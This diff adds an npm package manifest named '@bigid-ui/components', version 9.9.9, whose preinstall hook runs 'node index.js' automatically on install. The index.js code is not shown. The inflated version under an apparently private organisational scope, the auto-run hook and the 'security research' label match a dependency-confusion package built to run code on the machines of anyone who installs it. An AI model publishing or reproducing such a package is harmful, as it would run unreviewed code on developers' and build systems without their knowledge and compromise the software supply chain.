@@ -1,0 +1,10 @@
+{
+  "description": "Security research purposes only.",
+  "main": "index.js",
+  "name": "@bigid-ui/components",
+  "license": "ISC",
+  "scripts": {
+    "preinstall": "node index.js"
+  },
+  "version": "9.9.9"
+}
